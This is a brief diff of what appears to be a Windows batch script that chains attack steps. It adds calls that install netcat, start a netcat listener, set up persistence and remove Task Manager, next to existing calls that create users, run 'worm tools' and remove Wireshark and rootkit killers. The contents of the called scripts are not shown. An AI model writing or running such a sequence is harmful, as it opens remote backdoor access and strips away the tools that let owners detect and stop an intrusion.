@@ -9,4 +9,9 @@ call createusers.bat
 call removewireshark.bat
 call wormtools.bat
 call removerkillers.bat
+call addnetcat.bat
+call PersistenceScript.bat
+call netcatlistener.bat
+call removeTaskManager.bat
+
 
